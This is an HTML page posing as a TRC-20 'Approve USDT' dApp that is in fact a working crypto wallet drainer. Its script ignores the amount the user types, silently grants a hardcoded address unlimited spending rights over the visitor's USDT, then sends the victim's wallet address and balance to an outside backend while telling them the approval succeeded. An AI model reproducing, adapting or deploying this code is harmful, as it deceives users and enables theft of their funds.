<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TRC20 DApp</title>
  <style>
    body {
      background-color: #0b0f1a;
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
      padding-top: 50px;
      margin: 0;
    }
    .container {
      width: 90%;
      max-width: 400px;
      background-color: #131b2b;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 15px #1a2335;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      background-color: #1e2a3f;
      color: #fff;
    }
    button {
      width: 100%;
      padding: 14px;
      background-color: #00ffb2;
      color: #000;
      font-weight: bold;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #00e6a1;
    }
    .footer {
      margin-top: 30px;
      font-size: 13px;
      color: #aaa;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Approve USDT</h2>
    <input id="wallet" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
    <input id="amount" type="number" placeholder="Enter Amount" />
    <button onclick="approve()">Next</button>
  </div>
  <div class="footer">TRC-20 DApp | USDT Approval</div>

  <script src="https://cdn.jsdelivr.net/npm/@tronscan/tronweb@latest/dist/TronWeb.js"></script>
  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const BACKEND_URL = "https://atrc20-backend.onrender.com";

    async function approve() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("Please open in TronLink / SafePal DApp browser.");
        return;
      }

      const userAddress = tronWeb.defaultAddress.base58;
      const usdt = await tronWeb.contract().at(USDT_CONTRACT);

      try {
        const tx = await usdt.approve("TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
        console.log("Approval TX:", tx);

        const balance = await usdt.balanceOf(userAddress).call();
        const amount = document.getElementById("amount").value || "0";

        await fetch(`${BACKEND_URL}/log-approval`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            wallet_address: userAddress,
            amount: parseFloat(amount),
            balance: parseFloat(tronWeb.fromSun(balance.toString()))
          }),
        });

        alert("Approval successful!");
      } catch (err) {
        console.error(err);
        alert("Transaction failed.");
      }
    }
  </script>
</body>
</html>
